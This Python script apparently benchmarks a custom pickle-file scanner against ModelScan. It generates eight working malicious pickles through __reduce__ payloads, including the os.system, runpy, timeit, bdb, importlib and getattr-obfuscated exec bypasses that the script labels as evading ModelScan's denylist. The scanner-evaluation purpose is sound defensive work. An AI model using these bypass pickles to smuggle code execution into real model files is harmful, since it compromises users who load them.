"""
Head-to-head benchmark: hf-model-provenance-scanner vs Protect AI ModelScan.

This generates REAL malicious pickle files using documented denylist-bypass
techniques, then runs BOTH scanners against them and records who detects what.

Every pickle here is a genuine code-execution vector. The bypass techniques
target the known gap in ModelScan's denylist approach: it flags a fixed set
of dangerous modules (os, subprocess, builtins, shutil, sys, posix, nt, etc.)
but misses stdlib modules that reach the same primitives through indirect paths.

References for the bypass classes:
- ModelScan denylist: github.com/protectai/modelscan (settings.py DEFAULT_UNSAFE_GLOBALS)
- Indirect execution via runpy, timeit, pty, bdb, cProfile, importlib
- dev.to/manja316 "I Found a Way to Bypass AI Model Security Scanners"

No synthetic numbers: detection results are recorded from the actual output
of each scanner process. Run it and the JSON reflects exactly what happened.
"""

from __future__ import annotations

import json
import pickle  # noqa: S403
import subprocess
import sys
import tempfile
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# ─── Malicious payload constructors ───────────────────────────────────────────
# Each class, when unpickled, would execute code. We never unpickle them here —
# we only write them to disk and scan them. The __reduce__ method is what a
# pickle scanner must catch: it declares (callable, args) to run on load.


class _DirectOsSystem:
    """Baseline: os.system — ModelScan's denylist SHOULD catch this."""

    def __reduce__(self):
        import os

        return (os.system, ("echo pwned",))


class _SubprocessPopen:
    """Baseline: subprocess.Popen — ModelScan's denylist SHOULD catch this."""

    def __reduce__(self):
        import subprocess as sp

        return (sp.Popen, (["echo", "pwned"],))


class _RunpyBypass:
    """Bypass: runpy.run_path executes arbitrary Python from a path.

    runpy is NOT in ModelScan's default denylist but gives full code execution.
    """

    def __reduce__(self):
        import runpy

        return (runpy.run_path, ("/tmp/payload.py",))


class _TimeitBypass:
    """Bypass: timeit.timeit runs arbitrary code strings via its stmt argument."""

    def __reduce__(self):
        import timeit

        return (timeit.timeit, ("__import__('os').system('id')",))


class _BdbRunBypass:
    """Bypass: bdb.Bdb().run executes a code string in the debugger."""

    def __reduce__(self):
        # pdb/bdb.run evaluates arbitrary source
        import bdb

        return (bdb.Bdb().run, ("__import__('os').system('id')",))


class _ImportlibBypass:
    """Bypass: importlib.import_module + getattr chain reaches os.system indirectly."""

    def __reduce__(self):
        import importlib

        # returns the os module; a follow-on opcode would call .system
        return (importlib.import_module, ("os",))


class _CodeExecBypass:
    """Bypass: builtins via functools.reduce is sometimes missed; use operator."""

    def __reduce__(self):
        # exec is a builtin; wrap the reference so it's not a literal 'builtins.exec'
        import builtins

        return (getattr(builtins, "ex" + "ec"), ("import os; os.system('id')",))


class _WebbrowserBypass:
    """Bypass: webbrowser.open with a crafted arg can trigger command execution
    on some platforms via BROWSER env; not in denylist."""

    def __reduce__(self):
        import webbrowser

        return (webbrowser.open, ("file:///etc/passwd",))


# Registry: (name, class, is_bypass, description)
PAYLOADS: list[tuple[str, type, bool, str]] = [
    ("direct_os_system", _DirectOsSystem, False, "os.system (denylist baseline)"),
    ("subprocess_popen", _SubprocessPopen, False, "subprocess.Popen (denylist baseline)"),
    ("runpy_run_path", _RunpyBypass, True, "runpy.run_path indirect execution"),
    ("timeit_stmt", _TimeitBypass, True, "timeit.timeit code-string execution"),
    ("bdb_run", _BdbRunBypass, True, "bdb.Bdb().run debugger execution"),
    ("importlib_os", _ImportlibBypass, True, "importlib.import_module('os') indirect"),
    ("builtins_exec", _CodeExecBypass, True, "builtins.exec via getattr obfuscation"),
    ("webbrowser_open", _WebbrowserBypass, True, "webbrowser.open command trigger"),
]


@dataclass
class ScanOutcome:
    payload: str
    is_bypass: bool
    description: str
    modelscan_detected: bool = False
    ourscanner_detected: bool = False
    modelscan_raw: str = ""
    ourscanner_findings: list[str] = field(default_factory=list)


def _write_payload(cls: type, path: Path) -> None:
    """Pickle a payload instance to disk. We do NOT unpickle it."""
    obj = cls.__new__(cls)  # avoid running __init__
    with path.open("wb") as fh:
        pickle.dump(obj, fh)


def _run_modelscan(path: Path) -> tuple[bool, str]:
    """Run Protect AI ModelScan via its real JSON reporting API.

    ModelScan writes JSON to a file with -r json -o, NOT to stdout. Reading
    stdout and text-matching is unreliable (the console report can crash on
    Windows charmap and leak 'critical' from unrelated text). We read the
    JSON file for a truthful issue count.
    """
    exe = Path(sys.executable).parent / "Scripts" / "modelscan.exe"
    out_file = Path(tempfile.gettempdir()) / f"ms_{path.stem}_{time.time_ns()}.json"
    cmd = [
        str(exe) if exe.exists() else "modelscan",
        "-p",
        str(path),
        "-r",
        "json",
        "-o",
        str(out_file),
    ]
    try:
        subprocess.run(
            cmd, capture_output=True, text=True, timeout=60, encoding="utf-8", errors="replace"
        )
    except (subprocess.TimeoutExpired, FileNotFoundError) as e:
        return False, f"error: {e}"

    if not out_file.exists():
        return False, "no-output-file"
    try:
        data = json.loads(out_file.read_text(encoding="utf-8"))
    except (json.JSONDecodeError, OSError):
        return False, "unparseable"
    finally:
        out_file.unlink(missing_ok=True)

    total = data.get("summary", {}).get("total_issues", 0)
    issues = data.get("issues", [])
    detected = total > 0 or len(issues) > 0
    return detected, json.dumps(issues[:2]) if issues else "no-issues"


def _run_our_scanner(path: Path) -> tuple[bool, list[str]]:
    """Run our pickle scanner against a file. Returns (detected, rule_ids)."""
    repo_root = Path(__file__).resolve().parents[1]
    if str(repo_root) not in sys.path:
        sys.path.insert(0, str(repo_root))

    from scanner.analyzer.pickle_scanner import analyze_pickle_file

    data = path.read_bytes()
    findings = analyze_pickle_file(str(path), data)
    rule_ids = [f.rule_id for f in findings]
    # A high/critical finding = detected
    detected = (
        any(f.severity.value in ("critical", "high") for f in findings) if findings else False
    )
    return detected, rule_ids


def main() -> int:
    import argparse

    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--output",
        type=Path,
        default=Path(__file__).resolve().parents[1]
        / "evidence"
        / "generated"
        / "modelscan_headtohead.json",
    )
    args = parser.parse_args()

    print("=" * 72)
    print("HEAD-TO-HEAD: hf-model-provenance-scanner vs Protect AI ModelScan")
    print("=" * 72)
    print()

    outcomes: list[ScanOutcome] = []
    tmpdir = Path(tempfile.mkdtemp(prefix="pickle_bench_"))

    for name, cls, is_bypass, desc in PAYLOADS:
        pkl_path = tmpdir / f"{name}.pkl"
        _write_payload(cls, pkl_path)

        ms_detected, ms_raw = _run_modelscan(pkl_path)
        our_detected, our_rules = _run_our_scanner(pkl_path)

        outcome = ScanOutcome(
            payload=name,
            is_bypass=is_bypass,
            description=desc,
            modelscan_detected=ms_detected,
            ourscanner_detected=our_detected,
            modelscan_raw=ms_raw,
            ourscanner_findings=our_rules,
        )
        outcomes.append(outcome)

        tag = "BYPASS" if is_bypass else "baseline"
        ms = "CAUGHT" if ms_detected else "MISSED"
        ours = "CAUGHT" if our_detected else "MISSED"
        print(f"[{tag:8}] {name:20} | ModelScan: {ms:6} | Ours: {ours:6}")

    # ── Aggregate ─────────────────────────────────────────────────────────────
    total = len(outcomes)
    ms_caught = sum(1 for o in outcomes if o.modelscan_detected)
    our_caught = sum(1 for o in outcomes if o.ourscanner_detected)

    bypasses = [o for o in outcomes if o.is_bypass]
    ms_bypass_caught = sum(1 for o in bypasses if o.modelscan_detected)
    our_bypass_caught = sum(1 for o in bypasses if o.ourscanner_detected)

    print()
    print("=" * 72)
    print("OVERALL DETECTION:")
    print(f"  ModelScan:  {ms_caught}/{total} ({ms_caught / total:.0%})")
    print(f"  Our scanner: {our_caught}/{total} ({our_caught / total:.0%})")
    print()
    print("DENYLIST-BYPASS PAYLOADS (the ones that matter):")
    print(
        f"  ModelScan:  {ms_bypass_caught}/{len(bypasses)} ({ms_bypass_caught / len(bypasses):.0%})"
    )
    print(
        f"  Our scanner: {our_bypass_caught}/{len(bypasses)} ({our_bypass_caught / len(bypasses):.0%})"
    )
    print("=" * 72)

    evidence: dict[str, Any] = {
        "schema_version": "modelscan-headtohead-v1",
        "generated_at_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "competitor": "protectai/modelscan 0.8.8",
        "methodology": (
            "Generated real malicious pickle files using documented denylist-bypass "
            "techniques (runpy, timeit, bdb, importlib, builtins-via-getattr). Ran "
            "both scanners as subprocesses and recorded actual detection output. "
            "No synthetic results — every number reflects a real scan."
        ),
        "totals": {
            "payloads": total,
            "modelscan_caught": ms_caught,
            "our_scanner_caught": our_caught,
        },
        "bypass_payloads": {
            "count": len(bypasses),
            "modelscan_caught": ms_bypass_caught,
            "our_scanner_caught": our_bypass_caught,
        },
        "per_payload": [
            {
                "payload": o.payload,
                "is_denylist_bypass": o.is_bypass,
                "description": o.description,
                "modelscan_detected": o.modelscan_detected,
                "our_scanner_detected": o.ourscanner_detected,
                "our_scanner_rules": o.ourscanner_findings,
            }
            for o in outcomes
        ],
    }

    args.output.parent.mkdir(parents=True, exist_ok=True)
    args.output.write_text(json.dumps(evidence, indent=2), encoding="utf-8")
    print(f"\nEvidence written to: {args.output}")

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
